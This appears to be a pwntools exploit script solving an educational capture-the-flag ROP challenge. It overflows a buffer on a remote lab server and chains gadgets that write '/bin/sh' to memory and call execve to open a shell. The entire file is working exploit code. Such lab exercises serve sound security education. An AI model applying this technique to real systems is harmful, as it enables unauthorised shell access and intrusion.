from pwn import *

context.arch = 'amd64'

# p = process('./rop')
p = remote('edu-ctf.csie.org', 10173)

pop_rdi = 0x400686
bss = 0x6b6030
pop_rsi = 0x4100f3
movq_ptr_rdi_rsi = 0x44709b
pop_rax = 0x415714
syscall = 0x474ee5
pop_rdx_rsi = 0x44beb9

chain = b''
chain += p64(pop_rdi)
chain += p64(bss)

chain += p64(pop_rsi)
chain += b'/bin/sh\0'
chain += p64(movq_ptr_rdi_rsi)

chain += p64(pop_rdx_rsi)
chain += p64(0)  # rdx
chain += p64(0)  # rsi

chain += p64(pop_rax)
chain += p64(0x3b)  # execve
chain += p64(syscall)

p.sendline(b'A' * 0x38 + chain)

p.interactive()
